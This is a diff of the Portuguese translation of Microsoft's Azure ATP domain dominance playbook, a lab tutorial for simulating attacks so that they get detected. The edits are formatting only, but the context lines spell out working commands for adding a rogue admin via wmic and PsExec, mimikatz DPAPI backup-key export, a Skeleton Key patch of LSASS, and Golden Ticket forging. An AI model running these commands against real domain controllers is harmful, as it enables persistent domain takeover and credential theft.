@@ -2,17 +2,17 @@
 title: Guia estratégico de Predominância de Domínio do ATP do Azure
 description: O guia estratégico de predominância de domínio do ATP do Azure descreve como simular ataques de dominância do domínio para detecção do ATP do Azure
 ms.service: azure-advanced-threat-protection
-ms.topic: tutorial
+ms.topic: how-to
 author: shsagir
 ms.author: shsagir
 ms.date: 02/28/2019
 ms.reviewer: itargoet
-ms.openlocfilehash: b5903123e992f7540dd660da605a1568bf76ef91
-ms.sourcegitcommit: 63be53de5b84eabdeb8c006438dab45bd35a4ab7
+ms.openlocfilehash: 10266136b495c6fcc04355c8a16ca1c0ea00381c
+ms.sourcegitcommit: 2be59f0bd4c9fd0d3827e9312ba20aa8eb43c6b5
 ms.translationtype: HT
 ms.contentlocale: pt-BR
-ms.lasthandoff: 04/21/2020
-ms.locfileid: "79414583"
+ms.lasthandoff: 08/27/2020
+ms.locfileid: "88953738"
 ---
 # <a name="tutorial-domain-dominance-playbook"></a>Tutorial: Guia estratégico de predominância de domínio
 
@@ -57,19 +57,19 @@ Usando WMI na linha de comando, tente criar um processo localmente no controlado
    wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
    ```
 
-2. Agora, com o usuário criado, adicione o usuário ao grupo "Administradores" no controlador de domínio:
+1. Agora, com o usuário criado, adicione o usuário ao grupo "Administradores" no controlador de domínio:
 
    ``` cmd
    PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
    ```
 
-   ![Usar a execução remota de código (PsExec) para adicionar o novo usuário ao grupo Administrador no controlador de domínio](media/playbook-dominance-psexec_addtoadmins.png)
+    ![Usar a execução remota de código (PsExec) para adicionar o novo usuário ao grupo Administrador no controlador de domínio](media/playbook-dominance-psexec_addtoadmins.png)
 
-3. Acesse **Usuários e Computadores do Active Directory (ADUC)** no **ContosoDC** e localize **InsertedUser**. 
+1. Acesse **Usuários e Computadores do Active Directory (ADUC)** no **ContosoDC** e localize **InsertedUser**. 
 
-4. Clique com botão direito em **Propriedades** e verifique a associação.
+1. Clique com botão direito em **Propriedades** e verifique a associação.
 
-   ![Exibição das propriedades de "InsertedUser"](media/playbook-dominance-inserteduser_properties.png)
+    ![Exibição das propriedades de "InsertedUser"](media/playbook-dominance-inserteduser_properties.png)
 
 Atuando como invasor, você criou um novo usuário em seu laboratório usando WMI. Você também adicionou o novo usuário ao grupo Administradores usando PsExec. De uma perspectiva de persistência, outra credencial legítima e independente foi criada no controlador de domínio. Novas credenciais dão a um invasor acesso persistente ao controlador de domínio, caso o acesso de credencial anterior tenha sido descoberto e removido.
 
@@ -103,9 +103,9 @@ Usando **mimikatz**, tentaremos exportar a chave mestra do controlador de domín
    mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
    ```
 
-   ![Uso de mimikatz para exportar a chave de backup DPAPI do Active Directory](media/playbook-dominance-dpapi_mimikatz.png)
+    ![Uso de mimikatz para exportar a chave de backup DPAPI do Active Directory](media/playbook-dominance-dpapi_mimikatz.png)
 
-2. Verifique se a exportação de arquivo de chave mestra ocorreu. Procure no diretório onde você executou mimikatz.exe para ver os arquivos .der, .pfx, .pvk e .Key criados. Copie a chave herdada do prompt de comando.
+1. Verifique se a exportação de arquivo de chave mestra ocorreu. Procure no diretório onde você executou mimikatz.exe para ver os arquivos .der, .pfx, .pvk e .Key criados. Copie a chave herdada do prompt de comando.
 
 Como invasores, agora temos a chave para descriptografar quaisquer arquivos/dados confidenciais criptografados com DPAPI de *qualquer* computador em toda a floresta.
 
@@ -151,15 +151,15 @@ Vamos usar uma Skeleton Key para ver como funciona esse tipo de ataque:
    xcopy mimikatz.exe \\ContosoDC\c$\temp
    ```
 
-2. Com o **mimikatz** preparada no controlador de domínio, execute-o remotamente por meio de PsExec:
+1. Com o **mimikatz** preparada no controlador de domínio, execute-o remotamente por meio de PsExec:
 
    ``` cmd
    PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
    ```
 
-3. Você aplicou o patch no processo LSASS em **ContosoDC**.
+1. Você aplicou o patch no processo LSASS em **ContosoDC**.
 
-   ![Ataque Skeleton Key por meio de mimikatz](media/playbook-dominance-skeletonkey.png)
+    ![Ataque Skeleton Key por meio de mimikatz](media/playbook-dominance-skeletonkey.png)
 
 ### <a name="exploiting-the-skeleton-key-patched-lsass"></a>Explorar o LSASS corrigido pela Skeleton Key
 
@@ -202,25 +202,25 @@ Depois de roubar o "Golden Ticket", (conta "krbtgt" explicada [aqui por meio da 
    whoami /user
    ```
 
-   ![SID para usuário do golden ticket](media/playbook-dominance-golden_whoamisid.png)
+    ![SID para usuário do golden ticket](media/playbook-dominance-golden_whoamisid.png)
 
-2. Identifique e copie o SID do Domínio realçado na captura de tela acima.
+1. Identifique e copie o SID do Domínio realçado na captura de tela acima.
 
-3. Usando **mimikatz**, use o SID de Domínio copiado, junto com o hash NTLM do usuário do "krbtgt" roubado para gerar o TGT. Insira o texto a seguir em um cmd.exe como DiogoM:
+1. Usando **mimikatz**, use o SID de Domínio copiado, junto com o hash NTLM do usuário do "krbtgt" roubado para gerar o TGT. Insira o texto a seguir em um cmd.exe como DiogoM:
 
    ``` cmd
    mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
    ```
 
-   ![Gerar o Golden ticket](media/playbook-dominance-golden_generate.png)
+    ![Gerar o Golden ticket](media/playbook-dominance-golden_generate.png)
 
    A parte ```/ptt``` do comando nos permitiu passar imediatamente o tíquete gerado para a memória.
 
-4. Vamos verificar se a credencial está na memória.  Execute ```klist``` no console.
+1. Vamos verificar se a credencial está na memória.  Execute ```klist``` no console.
 
-   ![Resultados do klist depois de passar o tíquete gerado](media/playbook-dominance-golden_klist.png)
+    ![Resultados do klist depois de passar o tíquete gerado](media/playbook-dominance-golden_klist.png)
 
-5. Atuando como invasor, execute o seguinte comando Pass-the-Ticket para usá-lo no controlador de domínio:
+1. Atuando como invasor, execute o seguinte comando Pass-the-Ticket para usá-lo no controlador de domínio:
 
    ``` cmd
    dir \\ContosoDC\c$
@@ -228,7 +228,7 @@ Depois de roubar o "Golden Ticket", (conta "krbtgt" explicada [aqui por meio da 
 
    Sucesso! Você gerou um Golden Ticket **falso** para YasminC.
 
-   ![Executar o Golden Ticket via mimikatz](media/playbook-dominance-golden_ptt.png)
+    ![Executar o Golden Ticket via mimikatz](media/playbook-dominance-golden_ptt.png)
 
 Por que isso funcionou? O ataque de Golden Ticket funciona porque o tíquete gerado foi assinado corretamente com a chave "KRBTGT" que coletamos anteriormente. Esse tíquete permite que nós, no papel de invasor, obtenhamos acesso ao ContosoDC e adicionemos a nós mesmo a qualquer Grupo de Segurança que desejemos usar.
 
@@ -239,7 +239,7 @@ O ATP do Azure usa vários métodos para detectar ataques suspeitos desse tipo. 
 ![Golden Ticket sendo detectado](media/playbook-dominance-golden_detected.png)
 
 > [!Important]
->Lembrete. Desde que o KRBTGT coletado por um invasor permaneça válido dentro de um ambiente, os tíquetes gerados com ele também permanecerão válidos. Nesse caso, o invasor obtém a predominância de domínio persistente até que o [KRBTGT seja redefinido duas vezes](https://docs.microsoft.com/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).
+>Lembrete. Desde que o KRBTGT coletado por um invasor permaneça válido dentro de um ambiente, os tíquetes gerados com ele também permanecerão válidos. Nesse caso, o invasor obtém a predominância de domínio persistente até que o [KRBTGT seja redefinido duas vezes](/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).
 
 ## <a name="next-steps"></a>Próximas etapas
 
